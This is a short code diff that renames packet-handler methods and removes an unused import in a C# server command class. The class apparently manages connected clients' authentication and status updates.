@@ -1,5 +1,4 @@
-﻿using System;
-using System.IO;
+﻿using System.IO;
 using System.Windows.Forms;
 using xServer.Core.Networking;
 using xServer.Core.Packets.ClientPackets;
@@ -11,7 +10,7 @@ namespace xServer.Core.Commands
     /* THIS PARTIAL CLASS SHOULD CONTAIN METHODS THAT MANIPULATE THE CONNECTION. */
     public static partial class CommandHandler
     {
-        public static void HandleInitialize(Client client, Initialize packet)
+        public static void HandleGetAuthenticationResponse(Client client, GetAuthenticationResponse packet)
         {
             if (client.EndPoint.Address.ToString() == "255.255.255.255" || packet.Id.Length != 64)
                 return;
@@ -61,12 +60,12 @@ namespace xServer.Core.Commands
             }
         }
 
-        public static void HandleStatus(Client client, Status packet)
+        public static void HandleSetStatus(Client client, SetStatus packet)
         {
             FrmMain.Instance.SetStatusByClient(client, packet.Message);
         }
 
-        public static void HandleUserStatus(Client client, UserStatus packet)
+        public static void HandleSetUserStatus(Client client, SetUserStatus packet)
         {
             FrmMain.Instance.SetUserStatusByClient(client, packet.Message);
         }
